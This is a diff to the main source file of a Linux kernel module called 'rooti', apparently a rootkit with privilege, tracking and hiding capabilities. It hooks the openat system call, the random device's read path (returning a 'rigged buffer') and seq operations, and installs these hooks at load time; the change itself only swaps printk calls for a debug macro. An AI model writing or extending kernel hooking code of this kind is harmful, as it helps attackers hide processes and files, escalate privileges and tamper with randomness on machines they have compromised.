@@ -16,6 +16,7 @@
 #include "capabilities/privilege.h"
 #include "capabilities/track.h"
 #include "capabilities/hide.h"
+#include "utils.h"
 #include "config.h"
 
 MODULE_LICENSE("GPL");
@@ -87,14 +88,14 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
     char *filepath_user = (char *)regs->si;
     char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
     if (filepath_kernel == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        ROOTI_DEBUG("failed to allocate memory");
         return orig_openat(regs);
     }
 
     // Copy the requested filename to the kernel mode buffer
     int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
     if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        ROOTI_DEBUG("copy_from_user() failed: %d", err);
         kfree(filepath_kernel);
         return orig_openat(regs);
     }
@@ -259,14 +260,14 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     size_t len = iov_iter_count(iter);
     char *kernel_buf = kzalloc(len, GFP_KERNEL);
     if (kernel_buf == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
 
     // Copy the rigged buffer back into userspace
     int err = copy_to_iter(kernel_buf, len, iter);
     if (!err) {
-        printk(KERN_DEBUG "rooti: copy_to_iter() failed\n");
+        ROOTI_DEBUG("copy_to_iter() failed: %d", err);
         kfree(kernel_buf);
         return -EFAULT;
     }
@@ -300,32 +301,32 @@ struct rooti_seq_ops_hook seq_ops_hooks[] = {
 /* LKM initialization */
 static int __init rooti_init(void)
 {
-    printk(KERN_INFO "rooti: init\n");
+    ROOTI_DEBUG("init");
     
     int ret = rooti_hooking_init();
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_hooking_init() failed: %d", ret);
         return ret;
     }
 
     // Install function hooks :D
     ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
         return ret;
     }
 
     // Install file operation hooks :D
     ret = rooti_install_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_install_file_ops_hooks() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_install_file_ops_hooks() failed: %d", ret);
         return ret;
     }
 
     // Install seq operations hooks :D
     ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_install_seq_ops_hooks() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_install_seq_ops_hooks() failed: %d", ret);
         return ret;
     }
 
@@ -340,7 +341,8 @@ static int __init rooti_init(void)
 /* LKM cleanup */
 static void __exit rooti_exit(void)
 {
-    printk(KERN_INFO "rooti: exit\n");
+    ROOTI_DEBUG("exit");
+
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     rooti_uninstall_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
     rooti_uninstall_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
